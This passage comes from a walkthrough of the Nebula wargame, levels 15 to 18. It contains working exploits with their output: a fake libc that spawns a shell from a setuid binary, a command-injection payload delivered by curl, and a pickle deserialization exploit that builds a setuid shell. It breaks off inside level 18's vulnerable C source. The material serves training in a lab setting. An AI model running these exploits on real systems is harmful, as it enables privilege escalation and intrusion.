</code></pre></div><p><code>puts()</code> seems like an ok target for me! This is probably the function used to print the <em>strace it!</em> message. At this stage I figured I could take the same route as I did with the previous <code>LD_PRELOAD</code> attack, except this time I just &lsquo;fake&rsquo; it in my fake libc. I looked up the <code>puts()</code> arguments from the man page again and started a new function:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level15@nebula:/var/tmp/flag15$ cat fake_libc.c
<span style="color:#75715e">#include&lt;stdio.h&gt;</span>
int puts<span style="color:#f92672">(</span>const char *s<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
    printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Not the real puts!\n&#34;</span><span style="color:#f92672">)</span>;
<span style="color:#f92672">}</span>

level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6

level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available <span style="color:#f92672">(</span>required by /home/flag15/flag15<span style="color:#f92672">)</span>
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available <span style="color:#f92672">(</span>required by /var/tmp/flag15/libc.so.6<span style="color:#f92672">)</span>
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
</code></pre></div><p>Ow, that exploded pretty badly it seems. From the error message I figured the function <code>__cxa_finalize</code> simply did not exist in my library, so all I had to do was add it&hellip; Right? I googled the <a href="https://refspecs.linuxbase.org/LSB_3.2.0/LSB-Core-generic/LSB-Core-generic/baselib---cxa_finalize.html">function arguments</a> and added it to my fake libc:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level15@nebula:/var/tmp/flag15$ cat fake_libc.c
<span style="color:#75715e">#include&lt;stdio.h&gt;</span>
void __cxa_finalize<span style="color:#f92672">(</span>void * d<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
<span style="color:#f92672">}</span>

int puts<span style="color:#f92672">(</span>const char *s<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
    printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Not the real puts!\n&#34;</span><span style="color:#f92672">)</span>;
<span style="color:#f92672">}</span>
level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available <span style="color:#f92672">(</span>required by /home/flag15/flag15<span style="color:#f92672">)</span>
/home/flag15/flag15: relocation error: /home/flag15/flag15: symbol __libc_start_main, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
</code></pre></div><p>Oh! New error. I guess I was making progress. This time there is apparently no <code>__libc_start_main</code> in the library. At this stage I was a little confused as to what was going on here as this function was also in the RELO table for <code>flag15</code>. Anyways, as with <code>__cxa_finalize</code>, I Googled the <a href="http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html">function arguments</a> for this one too and added it to my fake libc. It was also at this stage that I realized I could just use this function instead of <code>puts</code>, so I went ahead and deleted the other functions:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level15@nebula:/var/tmp/flag15$ cat fake_libc.c
<span style="color:#75715e">#include&lt;stdio.h&gt;</span>

int __libc_start_main<span style="color:#f92672">(</span>int <span style="color:#f92672">(</span>*main<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>int, char * *, char * *<span style="color:#f92672">)</span>, int argc, char * * ubp_av, void <span style="color:#f92672">(</span>*init<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>, void <span style="color:#f92672">(</span>*fini<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>, void <span style="color:#f92672">(</span>*rtld_fini<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>, void <span style="color:#f92672">(</span>* stack_end<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
    <span style="color:#66d9ef">return</span> 0;
<span style="color:#f92672">}</span>

level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available <span style="color:#f92672">(</span>required by /home/flag15/flag15<span style="color:#f92672">)</span>
Inconsistency detected by ld.so: dl-lookup.c: 169: check_match: Assertion <span style="color:#e6db74">`</span>version-&gt;filename <span style="color:#f92672">==</span> <span style="color:#f92672">((</span>void *<span style="color:#f92672">)</span>0<span style="color:#f92672">)</span> <span style="color:#f92672">||</span> ! _dl_name_match_p <span style="color:#f92672">(</span>version-&gt;filename, map<span style="color:#f92672">)</span><span style="color:#960050;background-color:#1e0010">&#39;</span> failed!
</code></pre></div><p>Oh! Another new error :( This time though it was not about a missing function/symbol, but rather something I could not make out by myself. I found little information about this specific error. After a really really long time of searching I finally decided to <code>ldd</code> <code>flag15</code> again now that my fake libc is available:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level15@nebula:/var/tmp/flag15$ ldd ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available <span style="color:#f92672">(</span>required by /home/flag15/flag15<span style="color:#f92672">)</span>
    linux-gate.so.1 <span style="color:#f92672">=</span>&gt;  <span style="color:#f92672">(</span>0x00e47000<span style="color:#f92672">)</span>
    libc.so.6 <span style="color:#f92672">=</span>&gt; /var/tmp/flag15/libc.so.6 <span style="color:#f92672">(</span>0x00761000<span style="color:#f92672">)</span>
</code></pre></div><p>The search term <em>no version information available (required by</em> was the magic that finally got me towards an answer! I came across <a href="http://stackoverflow.com/questions/137773/what-does-the-no-version-information-available-error-from-linux-dynamic-linker">this</a> and <a href="http://superuser.com/questions/735736/no-version-information-available-required-by-usr-bin-ssh">this</a> post which talks about custom linking scripts. Basically, if I were to create a file with the contents <code>GLIBC_2.0 {};</code> in it and tell the linker at compile time (with <code>-Wl</code>) about it, then my problem will go away :)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level15@nebula:/var/tmp/flag15$ cat version.ld
GLIBC_2.0 <span style="color:#f92672">{</span>
<span style="color:#f92672">}</span>;

level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -Wl,--version-script<span style="color:#f92672">=</span>version.ld fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ldd ~flag15/flag15
    linux-gate.so.1 <span style="color:#f92672">=</span>&gt;  <span style="color:#f92672">(</span>0x002b3000<span style="color:#f92672">)</span>
    libc.so.6 <span style="color:#f92672">=</span>&gt; /var/tmp/flag15/libc.so.6 <span style="color:#f92672">(</span>0x00ca0000<span style="color:#f92672">)</span>
</code></pre></div><p>w00t. My <code>ldd</code> Error went away :)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -Wl,--version-script<span style="color:#f92672">=</span>version.ld fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: version <span style="color:#e6db74">`</span>GLIBC_2.1.3<span style="color:#960050;background-color:#1e0010">&#39;</span> not found <span style="color:#f92672">(</span>required by /var/tmp/flag15/libc.so.6<span style="color:#f92672">)</span>
</code></pre></div><p>Another version related error. This time though it was for GLIBC version 2.1.3. I spiraled down another Google tunnel with this one and eventually came across static linking options for the linker. Basically, with <code>-Bstatic</code> and <code>-static-libgcc</code> we tell the compiler not to link against shared libraries. So, I added these too:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script<span style="color:#f92672">=</span>version.ld,-Bstatic fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
Segmentation fault
</code></pre></div><p>And now we are segfaulting. Great! <strong>Not!</strong> I poked around <code>gdb</code> a little and prodded around. Eventually I figured I should check if my <code>__libc_start_main</code> function is being called before the crash:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level15@nebula:/var/tmp/flag15$ cat fake_libc.c
<span style="color:#75715e">#include&lt;stdio.h&gt;</span>

int __libc_start_main<span style="color:#f92672">(</span>int <span style="color:#f92672">(</span>*main<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>int, char * *, char * *<span style="color:#f92672">)</span>, int argc, char * * ubp_av, void <span style="color:#f92672">(</span>*init<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>, void <span style="color:#f92672">(</span>*fini<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>, void <span style="color:#f92672">(</span>*rtld_fini<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>, void <span style="color:#f92672">(</span>* stack_end<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
    printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;hi mom!\n&#34;</span><span style="color:#f92672">)</span>; /* Added this line! */
    <span style="color:#66d9ef">return</span> 0;
<span style="color:#f92672">}</span>
level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script<span style="color:#f92672">=</span>version.ld,-Bstatic fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
hi mom!
Segmentation fault
</code></pre></div><p>Yes! :D So even though I am causing <code>flag15</code> to crash, I have managed to introduce some code to it. I finally decided to add the <code>system()</code> call and recompile my fake libc.</p>
<p>So, to solve level15:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level15@nebula:/var/tmp/flag15$ cat fake_libc.c
<span style="color:#75715e">#include&lt;stdio.h&gt;</span>

int __libc_start_main<span style="color:#f92672">(</span>int <span style="color:#f92672">(</span>*main<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>int, char * *, char * *<span style="color:#f92672">)</span>, int argc, char * * ubp_av, void <span style="color:#f92672">(</span>*init<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>, void <span style="color:#f92672">(</span>*fini<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>, void <span style="color:#f92672">(</span>*rtld_fini<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>, void <span style="color:#f92672">(</span>* stack_end<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
    system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span><span style="color:#f92672">)</span>;
    <span style="color:#66d9ef">return</span> 0;
<span style="color:#f92672">}</span>
level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script<span style="color:#f92672">=</span>version.ld,-Bstatic fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id="level16">level16</h2>
<p><a href="https://exploit-exercises.com/nebula/level16/">Level16&rsquo;s Description</a>:</p>
<blockquote>
<p>There is a perl script running on port 1616.</p>
</blockquote>
<p>With the description we are provided with the source code of a small Perl program:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl"><span style="color:#75715e">#!/usr/bin/env perl</span>

<span style="color:#66d9ef">use</span> CGI <span style="color:#e6db74">qw{param}</span>;

<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;Content-type: text/html\n\n&#34;</span>;

<span style="color:#66d9ef">sub</span> <span style="color:#a6e22e">login</span> {
  $username <span style="color:#f92672">=</span> $_[<span style="color:#ae81ff">0</span>];
  $password <span style="color:#f92672">=</span> $_[<span style="color:#ae81ff">1</span>];

  $username <span style="color:#f92672">=~</span> tr<span style="color:#e6db74">/a-z/</span>A<span style="color:#f92672">-</span>Z<span style="color:#f92672">/</span>; <span style="color:#75715e"># conver to uppercase</span>
  $username <span style="color:#f92672">=~</span> <span style="color:#e6db74">s/\s.*//</span>;        <span style="color:#75715e"># strip everything after a space</span>

  @output <span style="color:#f92672">=</span> <span style="color:#e6db74">`egrep &#34;^$username&#34; /home/flag16/userdb.txt 2&gt;&amp;1`</span>;
  <span style="color:#66d9ef">foreach</span> $line (@output) {
      ($usr, $pw) <span style="color:#f92672">=</span> split(<span style="color:#e6db74">/:/</span>, $line);


      <span style="color:#66d9ef">if</span>($pw <span style="color:#f92672">=~</span> $password) {
          <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
      }
  }

  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}

<span style="color:#66d9ef">sub</span> <span style="color:#a6e22e">htmlz</span> {
  <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&#34;</span>);
  <span style="color:#66d9ef">if</span>($_[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
      <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Your login was accepted&lt;br/&gt;&#34;</span>);
  } <span style="color:#66d9ef">else</span> {
      <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Your login failed&lt;br/&gt;&#34;</span>);
  }
  <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;\n&#34;</span>);
}

htmlz(login(param(<span style="color:#e6db74">&#34;username&#34;</span>), param(<span style="color:#e6db74">&#34;password&#34;</span>)));
</code></pre></div><p>This script has a seemingly less obvious command injection vulnerability. The <code>egrep</code> command eventually gets the <code>$username</code> variable. This after it has gone through 2 sets of filters, one converting the username to uppercase and another truncating everything after a space. These filters are the core of the challenge.</p>
<p>Similarly to the other command injections, I replicated the filters so that I could print the output and see how I could manipulate them. The biggest problem being the fact that everything was converted to uppercase. Thankfully, that got sorted really quickly when I learnt of the <code>${A,,}</code> operator in bash. After quite a bit of trying different things, I finally got something that would work. I would first make the egrep happy by redirecting something to it to grep through. Once that was done, I declared a new variable <code>A</code> and set the command I wanted to run to it. Thereafter I converted it to lowercase and executed it wit <code>${A,,}</code> and commented the rest of the line out with a hash (#).</p>
<p>So, to solve level16:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level16@nebula:~$ vim /var/tmp/flag16.sh
level16@nebula:~$ chmod +x /var/tmp/flag16.sh
level16@nebula:~$ cat /var/tmp/flag16.sh
<span style="color:#75715e">#!/bin/sh</span>
gcc /var/tmp/shell.c -o /var/tmp/flag16
chmod <span style="color:#ae81ff">4777</span> /var/tmp/flag16
</code></pre></div><p>On my host machine, I requested the web page hosting the perl script, triggering <code>/var/tmp/flag16</code> to run:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">~ » curl -v <span style="color:#e6db74">&#34;http://192.168.217.239:1616/index.cgi?</span><span style="color:#66d9ef">$(</span>python -c <span style="color:#e6db74">&#39;import urllib; print urllib.urlencode({ &#34;username&#34; : &#34;&#34;&#34;&#34;&lt;/etc/passwd;A=&#34;/var/tmp/flag16.sh&#34;;${A,,};#&#34;&#34;&#34;, &#34;password&#34; : &#34;a&#34; })&#39;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
* Hostname was NOT found in DNS cache
*   Trying 192.168.217.239...
* Connected to 192.168.217.239 <span style="color:#f92672">(</span>192.168.217.239<span style="color:#f92672">)</span> port <span style="color:#ae81ff">1616</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
&gt; GET /index.cgi?username<span style="color:#f92672">=</span>%22%3C%2Fetc%2Fpasswd%3BA%3D%22%2Fvar%2Ftmp%2Fflag16.sh%22%3B%24%7BA%2C%2C%7D%3B%23&amp;password<span style="color:#f92672">=</span>a HTTP/1.1
&gt; User-Agent: curl/7.37.1
&gt; Host: 192.168.217.239:1616
&gt; Accept: */*
&gt;
* HTTP 1.0, assume close after body
&lt; HTTP/1.0 <span style="color:#ae81ff">200</span> OK
&lt; Content-type: text/html
&lt;
&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Your login failed&lt;br/&gt;Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;
* Closing connection <span style="color:#ae81ff">0</span>
</code></pre></div><p>And then, just to read the flag:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level16@nebula:~$ /var/tmp/flag16
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id="level17">level17</h2>
<p><a href="https://exploit-exercises.com/nebula/level17/">Level17&rsquo;s Description</a>:</p>
<blockquote>
<p>There is a python script listening on port 10007 that contains a vulnerability.</p>
</blockquote>
<p>With the description we are provided with the source code of a small Python program:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl"><span style="color:#75715e">#!/usr/bin/python</span>

import os
import pickle
import time
import socket
import signal

signal<span style="color:#f92672">.</span>signal(signal<span style="color:#f92672">.</span>SIGCHLD, signal<span style="color:#f92672">.</span>SIG_IGN)

def server(skt):
  line <span style="color:#f92672">=</span> skt<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)

  obj <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>loads(line)

  <span style="color:#66d9ef">for</span> i in obj:
      clnt<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;why did you send me &#34;</span> <span style="color:#f92672">+</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;?\n&#34;</span>)

skt <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM, <span style="color:#ae81ff">0</span>)
skt<span style="color:#f92672">.</span>bind((<span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, <span style="color:#ae81ff">10007</span>))
skt<span style="color:#f92672">.</span>listen(<span style="color:#ae81ff">10</span>)

<span style="color:#66d9ef">while</span> True:
  clnt, addr <span style="color:#f92672">=</span> skt<span style="color:#f92672">.</span>accept()

  <span style="color:#66d9ef">if</span>(os<span style="color:#f92672">.</span>fork() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>):
      clnt<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;Accepted connection from %s:%d&#34;</span> % <span style="color:#960050;background-color:#1e0010">(</span>addr[<span style="color:#ae81ff">0</span>], addr[<span style="color:#ae81ff">1</span>]))
      server(clnt)
      exit(<span style="color:#ae81ff">1</span>)
</code></pre></div><p>With this level, it was immediately obvious that user input was being used to unpickle. This is dangerous as user supplied code could be executed when the unpickle occurs. So, my plan was to write a simple class with a <code>__reduce__</code> method to pickle and send that over the socket that this code is listening on.</p>
<p>So, to solve level17:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level17@nebula:/var/tmp/flag17-prep$ cat sploit.py
from netcat import Netcat
import pickle
import os

command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;gcc /var/tmp/shell.c -o /var/tmp/flag17; chmod 4777 /var/tmp/flag17&#34;&#34;&#34;</span>

<span style="color:#75715e"># setup the pickle</span>
class DoCmd<span style="color:#f92672">(</span>object<span style="color:#f92672">)</span>:
    def __reduce__<span style="color:#f92672">(</span>self<span style="color:#f92672">)</span>:
        <span style="color:#66d9ef">return</span> <span style="color:#f92672">(</span>os.system, <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;{cmd}&#39;</span>.format<span style="color:#f92672">(</span>cmd <span style="color:#f92672">=</span> command<span style="color:#f92672">)</span>,<span style="color:#f92672">))</span>

nc <span style="color:#f92672">=</span>  Netcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, 10007<span style="color:#f92672">)</span>
nc.read<span style="color:#f92672">()</span>
nc.write<span style="color:#f92672">(</span>pickle.dumps<span style="color:#f92672">(</span>DoCmd<span style="color:#f92672">()))</span>
nc.close<span style="color:#f92672">()</span>

level17@nebula:/var/tmp/flag17-prep$ python sploit.py
level17@nebula:/var/tmp/flag17-prep$ /var/tmp/flag17
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id="level18">level18</h2>
<p><a href="https://exploit-exercises.com/nebula/level18/">Level18&rsquo;s Description</a>:</p>
<blockquote>
<p>Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.</p>
</blockquote>
<p>With the description we are provided with the source code of a small C program:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;getopt.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">struct</span> {
  FILE <span style="color:#f92672">*</span>debugfile;
  <span style="color:#66d9ef">int</span> verbose;
  <span style="color:#66d9ef">int</span> loggedin;
} globals;

<span style="color:#75715e">#define dprintf(...) if(globals.debugfile) \
</span><span style="color:#75715e">  fprintf(globals.debugfile, __VA_ARGS__)
</span><span style="color:#75715e">#define dvprintf(num, ...) if(globals.debugfile &amp;&amp; globals.verbose &gt;= num) \
</span><span style="color:#75715e">  fprintf(globals.debugfile, __VA_ARGS__)
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#define PWFILE &#34;/home/flag18/password&#34;
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">login</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pw)
{
  FILE <span style="color:#f92672">*</span>fp;

  fp <span style="color:#f92672">=</span> fopen(PWFILE, <span style="color:#e6db74">&#34;r&#34;</span>);
  <span style="color:#66d9ef">if</span>(fp) {
      <span style="color:#66d9ef">char</span> file[<span style="color:#ae81ff">64</span>];

      <span style="color:#66d9ef">if</span>(fgets(file, <span style="color:#66d9ef">sizeof</span>(file) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>, fp) <span style="color:#f92672">==</span> NULL) {
          dprintf(<span style="color:#e6db74">&#34;Unable to read password file %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, PWFILE);
          <span style="color:#66d9ef">return</span>;
      }
                fclose(fp);
      <span style="color:#66d9ef">if</span>(strcmp(pw, file) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">return</span>;
  }
  dprintf(<span style="color:#e6db74">&#34;logged in successfully (with%s password file)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
      fp <span style="color:#f92672">==</span> NULL <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;out&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>);

  globals.loggedin <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;

}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">notsupported</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>what)
{
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer <span style="color:#f92672">=</span> NULL;
  asprintf(<span style="color:#f92672">&amp;</span>buffer, <span style="color:#e6db74">&#34;--&gt; [%s] is unsupported at this current time.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, what);
  dprintf(what);
  free(buffer);
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setuser</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>user)
{
  <span style="color:#66d9ef">char</span> msg[<span style="color:#ae81ff">128</span>];

  sprintf(msg, <span style="color:#e6db74">&#34;unable to set user to &#39;%s&#39; -- not supported.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, user);
  printf(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, msg);

}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
{
  <span style="color:#66d9ef">char</span> c;

  <span style="color:#66d9ef">while</span>((c <span style="color:#f92672">=</span> getopt(argc, argv, <span style="color:#e6db74">&#34;d:v&#34;</span>)) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
      <span style="color:#66d9ef">switch</span>(c) {
          <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;d&#39;</span><span style="color:#f92672">:</span>
              globals.debugfile <span style="color:#f92672">=</span> fopen(optarg, <span style="color:#e6db74">&#34;w+&#34;</span>);
              <span style="color:#66d9ef">if</span>(globals.debugfile <span style="color:#f92672">==</span> NULL) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;Unable to open %s&#34;</span>, optarg);
              setvbuf(globals.debugfile, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
              <span style="color:#66d9ef">break</span>;
          <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;v&#39;</span><span style="color:#f92672">:</span>
              globals.verbose<span style="color:#f92672">++</span>;
              <span style="color:#66d9ef">break</span>;
      }
  }

  dprintf(<span style="color:#e6db74">&#34;Starting up. Verbose level = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, globals.verbose);

  setresgid(getegid(), getegid(), getegid());
  setresuid(geteuid(), geteuid(), geteuid());

  <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>) {
      <span style="color:#66d9ef">char</span> line[<span style="color:#ae81ff">256</span>];
      <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p, <span style="color:#f92672">*</span>q;

      q <span style="color:#f92672">=</span> fgets(line, <span style="color:#66d9ef">sizeof</span>(line)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, stdin);
      <span style="color:#66d9ef">if</span>(q <span style="color:#f92672">==</span> NULL) <span style="color:#66d9ef">break</span>;
      p <span style="color:#f92672">=</span> strchr(line, <span style="color:#e6db74">&#39;\n&#39;</span>); <span style="color:#66d9ef">if</span>(p) <span style="color:#f92672">*</span>p <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
      p <span style="color:#f92672">=</span> strchr(line, <span style="color:#e6db74">&#39;\r&#39;</span>); <span style="color:#66d9ef">if</span>(p) <span style="color:#f92672">*</span>p <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;

      dvprintf(<span style="color:#ae81ff">2</span>, <span style="color:#e6db74">&#34;got [%s] as input</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, line);

      <span style="color:#66d9ef">if</span>(strncmp(line, <span style="color:#e6db74">&#34;login&#34;</span>, <span style="color:#ae81ff">5</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
          dvprintf(<span style="color:#ae81ff">3</span>, <span style="color:#e6db74">&#34;attempting to login</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
          login(line <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span>);
